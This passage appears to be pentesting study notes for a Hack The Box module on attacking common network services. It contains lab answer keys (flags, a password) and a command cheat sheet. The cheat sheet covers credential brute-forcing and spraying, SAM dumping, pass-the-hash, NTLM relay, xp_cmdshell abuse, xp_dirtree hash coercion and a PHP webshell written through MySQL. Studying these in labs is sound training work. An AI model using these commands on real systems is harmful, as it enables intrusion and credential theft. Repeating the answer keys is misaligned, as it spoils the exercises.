| Attacking Email Services Q2 | Flag in email inbox? | **HTB{w34k_p4$$w0rd}** |
| Easy Assessment Q1 | flag.txt on Administrator Desktop? | **HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}** |
| Medium Assessment Q1 | flag.txt via SSH as simon? | **HTB{1qay2wsx3EDC4rfv_M3D1UM}** |
| Hard Assessment Q1 | File belonging to user "simon"? | **random.txt** |
| Hard Assessment Q2 | Password for Fiona? | **48Ns72!bns74@S84NNNSl** |
| Hard Assessment Q3 | Other user to compromise for admin? | **john** |
| Hard Assessment Q4 | flag.txt on Administrator Desktop (linked server)? | **HTB{46u$!n9_l!nk3d_$3rv3r$}** |

---

## Outstanding Sections

- [x] CS.1. CoreFTP 725 Directory Traversal (CVE-2022-22836) via curl PUT
- [x] CS.2. MSSQL UNC Path Injection (xp_dirtree + impacket-smbserver → NetNTLMv2 capture)
- [x] CS.3. sqlcmd. Linux MSSQL client syntax
- [x] CS.4. MSSQL database/table enumeration (INFORMATION_SCHEMA.TABLES pattern)
- [x] CS.5. MSSQL Impersonation (sys.server_permissions query + EXECUTE AS LOGIN + is_srvrolemember)
- [x] CS.6. MSSQL Linked Server Attacks (sysservers + EXECUTE...AT + xp_cmdshell remote + nested escaping)
- [x] CS.7. DNS subdomain brute force (subbrute + custom resolvers.txt + dig AXFR TXT grep)
- [x] CS.8. Email attacks (Hydra SMTP with email-format username, Hydra POP3, nc POP3 manual session)
- [x] CS.9. SMB enumeration + anonymous access (enum4linux R/W detection, smbclient -N null session, prompt + mget)
- [x] CS.10. Hydra FTP thread throttling (-t 1)
- [x] CS.11. Skills Assessment Easy chain (smtp-user-enum + Hydra FTP -t 1 + CoreFTP PUT exploit / MySQL INTO OUTFILE)
- [x] CS.12. Skills Assessment Medium chain (DNS AXFR vHost → anon FTP port 30021 → Hydra POP3 → nc POP3 session → SSH key in email)
- [x] CS.13. Skills Assessment Hard chain (SMB null → file gathering → CME spray → RDP → SQLCMD impersonation → linked server → xp_cmdshell)
- [x] CS.14. All 20 Q&A answers
- All labs are HTB spawnable targets; no Offsec VM required for this note

---

## Related Boxes

- **[Jerry](https://0xdf.gitlab.io/2019/02/21/htb-jerry.html)** (HTB, Windows, Easy): Tomcat Manager → WAR file upload → SYSTEM. Similar to CS.1 (authenticated file write → code execution via a service management interface). Same pattern: authenticated → write to web root → execute.
- **[Bastion](https://www.hackthebox.com/machines/bastion)** (HTB, Windows, Easy): SMB anonymous share access → VHD mount → SAM dump. Direct parallel to CS.9 (anonymous SMB → sensitive file retrieval from a share).
- **[Querier](https://0xdf.gitlab.io/2019/06/22/htb-querier.html)** (HTB, Windows, Medium): MSSQL xp_dirtree hash coercion → crack NetNTLMv2 → return to MSSQL as higher privilege. Direct hands-on example of CS.2 (UNC path injection via xp_dirtree).
- **[Monteverde](https://0xdf.gitlab.io/2020/06/13/htb-monteverde.html)** (HTB, Windows, Medium): SMB password spray → SMB file access → credential discovery. Adjacent workflow to CS.9 + CS.13 (null session enumeration → password lists → SMB spray).
- **[Archetype](https://www.hackthebox.com/machines/archetype)** (HTB, Windows, Very Easy/Starting Point): MSSQL hash theft via xp_dirtree + Responder → impacket-psexec. The canonical walkthrough of CS.2 technique.


---

## HTB Module Quick Reference

Commands formatted for use with the [[Pre-Engagement Kali Setup]] variable block.

```bash
# ============================================================
# FTP
# ============================================================
ftp $BoxIP                          # interactive FTP client
nc -v $BoxIP 21                     # raw banner grab
# Anonymous login test:
ftp $BoxIP   # user: anonymous, pass: (blank or email)

# Brute-force FTP credentials
hydra -l $Username -P /usr/share/wordlists/rockyou.txt ftp://$BoxIP

# ============================================================
# SMB
# ============================================================
# Null session — list shares without credentials
smbclient -N -L //$BoxIP

# Authenticated share listing
smbclient -U $Username //$BoxIP/share -p $Password

# smbmap — enumerate shares + permissions
smbmap -H $BoxIP
smbmap -u $Username -p $Password -d $Domain -H $BoxIP
smbmap -H $BoxIP -r notes                                    # browse a share
smbmap -H $BoxIP --download "notes\note.txt"                 # download file
smbmap -H $BoxIP --upload test.txt "notes\test.txt"          # upload file

# enum4linux-ng — automated null session enumeration
./enum4linux-ng.py $BoxIP -A -C

# CrackMapExec — spray, exec, dump
crackmapexec smb $BoxIP -u $Username -p $Password             # credential test
crackmapexec smb $BoxIP -u /tmp/userlist.txt -p 'Company01!'  # password spray
crackmapexec smb $BoxIP -u $Username -p $Password -x 'whoami' --exec-method smbexec
crackmapexec smb $BoxIP -u $Username -p $Password --sam       # dump SAM hashes
crackmapexec smb $BoxIP -u $Username -H $NThash               # Pass-the-Hash

# PSExec / NTLM relay
impacket-psexec $Domain/$Username:$Password@$BoxIP
impacket-ntlmrelayx --no-http-server -smb2support -t $BoxIP   # relay captured auth

# ============================================================
# SQL DATABASES
# ============================================================
# MySQL connect
mysql -u $Username -p$Password -h $BoxIP

# MSSQL connect (Windows auth)
sqsh -S $BoxIP -U $Domain\\$Username -P "$Password" -h
impacket-mssqlclient $Domain/$Username:$Password@$BoxIP -windows-auth

# MSSQL: enable and use xp_cmdshell
sqlcmd> EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE;
sqlcmd> EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE;
sqlcmd> xp_cmdshell 'whoami'

# MSSQL: hash coercion via xp_dirtree
sqlcmd> EXEC master..xp_dirtree '\\$LocalIP\share\'   # → Responder catches the hash

# MSSQL: read local file
sqlcmd> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents

# MySQL: write webshell
mysql> SELECT "<?php echo shell_exec(\$_GET['c']);?>" INTO OUTFILE '/var/www/html/shell.php';
mysql> SHOW VARIABLES LIKE "secure_file_priv";   # check writable dirs first

# ============================================================
# RDP
# ============================================================
# Password spray
crowbar -b rdp -s $BoxIP/32 -U users.txt -c 'password123'
hydra -L users.txt -p 'password123' $BoxIP rdp

# Connect
xfreerdp /v:$BoxIP /u:$Username /p:$Password /dynamic-resolution +clipboard
xfreerdp /v:$BoxIP /u:$Username /pth:$NThash /dynamic-resolution +clipboard   # PtH

# Session hijack (no password — requires SYSTEM)
tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}

# Enable Restricted Admin Mode (required for xfreerdp /pth)
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

# ============================================================
# DNS
# ============================================================
dig AXFR @ns1.$BoxName $Domain               # zone transfer attempt
host -t MX $Domain                           # find mail servers
subfinder -d $Domain -v                      # subdomain brute-force

# ============================================================
# EMAIL (SMTP / POP3)
# ============================================================
telnet $BoxIP 25                             # raw SMTP banner
smtp-user-enum -M RCPT -U users.txt -D $Domain -t $BoxIP   # user enum
hydra -L users.txt -p 'Company01!' -f $BoxIP pop3           # POP3 brute-force

# Open relay test
swaks --from notifications@$Domain --to employees@$Domain \
  --header 'Subject: Test' --body 'Message' --server $BoxIP
```
